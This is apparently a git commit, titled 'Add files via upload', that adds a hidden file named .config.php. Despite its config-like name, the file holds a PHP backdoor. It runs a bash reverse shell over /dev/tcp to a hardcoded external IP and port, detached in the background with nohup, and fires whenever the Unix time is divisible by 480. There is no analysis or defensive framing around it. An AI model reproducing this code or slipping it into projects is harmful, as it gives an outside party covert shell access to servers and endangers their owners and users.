13579a1ea4b700c23631ffb0c26e8334da9dde8a
dvreux <148452795+dvreux@users.noreply.github.com>
2025-08-09 17:26:56 +0700

    Add files via upload

---
+++ .config.php
@@ -0,0 +1,13 @@
+<?php
+function reverse_shell() {
+    $ip = '188.166.181.70';
+    $port = '444';
+    $payload = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
+
+    shell_exec("nohup $payload > /dev/null 2>&1 &");
+}
+
+if (time() % 480 == 0) {
+    reverse_shell();
+}
+?>
